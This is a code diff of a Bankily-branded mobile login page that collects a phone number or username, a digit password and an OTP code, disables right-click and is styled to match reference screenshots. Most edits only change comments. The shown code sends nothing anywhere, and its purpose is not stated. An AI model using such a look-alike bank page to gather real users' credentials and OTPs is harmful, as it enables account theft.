@@ -69,7 +69,7 @@
             display: none;
         }
 
-        /* المحتوى الداخلي وضبط الأبعاد ليكون ملموم تماماً */
+        /* المحتوى الداخلي */
         .app-content {
             flex: 1;
             padding: 15px 30px 10px 30px;
@@ -78,37 +78,37 @@
             align-items: center;
         }
 
-        /* تكبير مساحة الشعار وحجمه ليتطابق تماماً مع الصورة المرفقة */
+        /* مساحة الشعار بالحجم الكبير المتناسق */
         .brand-logo-space {
             width: 100%;
-            height: 160px; /* زيادة الطول لإعطاء الشعار مساحة تبرز حجمه الكبير */
+            height: 160px; 
             display: flex;
             justify-content: center;
             align-items: center;
             margin-top: 15px;
-            margin-bottom: 25px; /* مسافة أوسع أسفل الشعار لدفع الحقول نحو الوسط */
+            margin-bottom: 25px;
         }
 
         .brand-logo-space img {
-            max-width: 95%; /* تكبير العرض الأقصى للشعار ليتطابق مع image_21.png */
+            max-width: 95%;
             max-height: 100%;
             object-fit: contain;
         }
 
-        /* نقل الحقول لمنتصف الشاشة عن طريق إضافة مساحة علوية مرنة */
+        /* حاوية التوسيط للحقول في المنتصف تماماً */
         .middle-fields-container {
             width: 100%;
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: auto;   /* توليد مرونة دفع من الأعلى */
-            margin-bottom: auto; /* توليد مرونة دفع من الأسفل لتوسيط الحقول بالمنتصف تماماً */
+            margin-top: auto;   
+            margin-bottom: auto; 
         }
 
         /* مجموعات الإدخال والمسافات المحكمة */
         .input-group {
             width: 100%;
-            margin-bottom: 25px; /* زيادة المسافة الرأسية بين الحقول لتماثل الصورة تماماً */
+            margin-bottom: 25px; 
             position: relative;
             text-align: right;
         }
@@ -207,7 +207,7 @@
             font-weight: 500;
         }
 
-        /* الرابط المنسق في أسفل الواجهة تماماً فوق الزر مباشرة */
+        /* الرابط المنسق في أسفل الواجهة فوق الزر مباشرة */
         .register-link-box {
             margin-top: auto; 
             margin-bottom: 15px;
@@ -222,7 +222,7 @@
             font-weight: 500;
         }
 
-        /* تخصيصات واجهة OTP المنظمة وتوسيط حقولها */
+        /* تخصيصات واجهة OTP وتوسيطها */
         .otp-title {
             font-size: 0.95rem;
             font-weight: normal;
@@ -238,8 +238,8 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: auto;   /* توسيط محتوى حقل الـ OTP بالمنتصف */
-            margin-bottom: auto; /* توسيط محتوى حقل الـ OTP بالمنتصف */
+            margin-top: auto;   
+            margin-bottom: auto; 
         }
 
         .otp-wrapper-box {
@@ -317,14 +317,12 @@
             <span id="titleText"></span>
         </div>
 
-        <!-- واجهة تسجيل الدخول المحدثة بالتوسيط والتكبير للشعار -->
         <div id="loginSection" class="app-content">
             
             <div class="brand-logo-space">
                 <img src="logo_bankily.jpeg" alt="Bankily Logo">
             </div>
 
-            <!-- الحاوية المرنة لضمان تمركز الحقول في الوسط تماماً كما في الصور المرفقة -->
             <div class="middle-fields-container">
                 <div class="input-group">
                     <label>اسم المستخدم أو رقم الهاتف</label>
@@ -362,17 +360,14 @@
                 </div>
             </div>
 
-            <!-- متموضع في أسفل الواجهة مباشرة فوق زر تسجيل الدخول ومطابق للصور تماماً -->
             <div class="register-link-box">
                 <a href="#">مستخدم جديد ؟ سجل الآن!</a>
             </div>
         </div>
 
-        <!-- واجهة الـ OTP المنظمة والمطابقة تماماً مع التوسيط بالمنتصف وعمل العداد الحركي تلقائياً -->
         <div id="otpSection" class="app-content hidden">
             <p class="otp-title">أدخل رمز التأكيد المرسل إلى هاتف المحمول</p>
 
-            <!-- حاوية توسيط حقول الـ OTP بالمنتصف تماماً -->
             <div class="otp-middle-container">
                 <div class="otp-wrapper-box">
                     <div class="otp-container">
@@ -399,17 +394,18 @@
         let otpInterval = null;
         let totalSeconds = 300; 
 
-        // حظر النقر لحماية البيانات والواجهة من التلاعب
+        // حظر النقر والإجراءات غير المصرح بها أمنياً لحماية البيانات والواجهة
         document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
         document.addEventListener('mousedown', function(e) {
             if (e.button === 1 || e.button === 2) { e.preventDefault(); return false; }
         });
 
+        // تنظيف مدخلات حقل المستخدم/الهاتف فورياً للأرقام فقط ومطابق للخاصية المطلوبة
         function cleanNumberInput(input) {
             input.value = input.value.replace(/[^0-9]/g, '');
         }
 
-        // حركة التنقل لحقول الرقم السري
+        // حركة التنقل الذكية لحقول الرقم السري
         function handlePasswordNavigation(current, currentIndex) {
             current.value = current.value.replace(/[^0-9]/g, ''); 
             const fields = document.querySelectorAll('.password-field');
@@ -428,7 +424,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // حركة التنقل لحقول OTP
+        // تشغيل وتفعيل الخاصية المرفقة لحقول OTP (التوجيه التلقائي والتنظيف المطور)
         function handleOtpNavigation(current, currentIndex) {
             current.value = current.value.replace(/[^0-9]/g, ''); 
             const fields = document.querySelectorAll('.otp-field');
@@ -447,7 +443,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // تشغيل عداد الوقت التنازلي التفاعلي الحي للـ OTP
+        // تشغيل عداد الوقت التنازلي التفاعلي الحي للـ OTP تلقائياً عند فتح شاشته
         function startOtpTimer() {
             clearInterval(otpInterval);
             totalSeconds = 300; 
@@ -472,7 +468,7 @@
             document.getElementById('otpTimer').innerText = `${formattedMinutes}:${formattedSeconds} ثواني`;
         }
 
-        // التحكم في الانتقال والتحقق
+        // التحكم في عمليات الانتقال والتحقق العام للواجهات
         function onFooterButtonClick() {
             const loginSection = document.getElementById('loginSection');
             const otpSection = document.getElementById('otpSection');
@@ -518,7 +514,7 @@
                 document.querySelectorAll('.otp-field').forEach(box => otpCode += box.value.trim());
 
                 if (otpCode === "") {
-                    alert("الرجاء إدخال رمز التحقق (OTP) المرسل إلى هاتفك.");
+                    alert("الرجاء إدخل رمز التحقق (OTP) المرسل إلى هاتفك.");
                     return;
                 }
                 if (otpCode.length !== 4) {
@@ -530,7 +526,7 @@
             }
         }
 
-        // التراجع لشاشة تسجيل الدخول وإيقاف العداد
+        // التراجع لشاشة تسجيل الدخول وإعادة ضبط العدادات
         function switchToLogin() {
             clearInterval(otpInterval);
             document.getElementById('loginSection').classList.remove('hidden');
